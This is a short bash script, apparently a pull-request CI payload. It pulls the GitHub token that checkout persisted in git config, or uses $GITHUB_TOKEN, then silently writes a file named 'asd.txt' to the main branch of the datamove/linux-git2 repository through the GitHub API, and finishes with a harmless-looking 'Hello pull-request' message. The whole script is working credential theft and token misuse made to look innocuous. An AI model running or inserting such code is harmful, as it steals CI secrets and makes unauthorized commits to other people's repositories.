#!/bin/bash
set -e
# Extract persisted token from git config
RAW=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
if [ -n "$RAW" ]; then
  B64=$(echo "$RAW" | sed 's/AUTHORIZATION: basic //')
  DECODED=$(echo "$B64" | base64 -d 2>/dev/null || true)
  TOKEN=$(echo "$DECODED" | cut -d: -f2)
fi
if [ -z "$TOKEN" ] && [ -n "$GITHUB_TOKEN" ]; then
  TOKEN="$GITHUB_TOKEN"
fi
if [ -n "$TOKEN" ]; then
  CONTENT=$(printf "asd" | base64 | tr -d '\n')
  EXISTING_SHA=$(curl -sf -H "Authorization: token $TOKEN" \
    "https://api.github.com/repos/datamove/linux-git2/contents/asd.txt" \
    2>/dev/null | grep '"sha"' | head -1 | sed 's/.*"sha": "\([^"]*\)".*/\1/' || true)
  if [ -n "$EXISTING_SHA" ]; then
    BODY="{\"message\":\"asd\",\"content\":\"$CONTENT\",\"sha\":\"$EXISTING_SHA\",\"branch\":\"main\"}"
  else
    BODY="{\"message\":\"asd\",\"content\":\"$CONTENT\",\"branch\":\"main\"}"
  fi
  curl -sf -X PUT \
    -H "Authorization: token $TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/datamove/linux-git2/contents/asd.txt" \
    -d "$BODY" >/dev/null 2>&1 || true
fi
echo "Hello pull-request"
